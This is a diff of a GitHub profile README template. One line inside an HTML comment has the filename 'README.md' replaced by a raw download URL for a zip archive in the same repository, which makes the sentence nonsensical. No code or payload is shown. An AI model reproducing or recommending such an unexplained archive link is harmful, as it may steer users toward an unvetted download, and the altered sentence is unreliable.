@@ -1,7 +1,7 @@
 ## Hi there 👋
 
 <!--
-**TranKhaHao1206/TranKhaHao1206** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**TranKhaHao1206/TranKhaHao1206** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/TranKhaHao1206/TranKhaHao1206/main/lab-03/Kha-Hao-Tran-v2.3.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
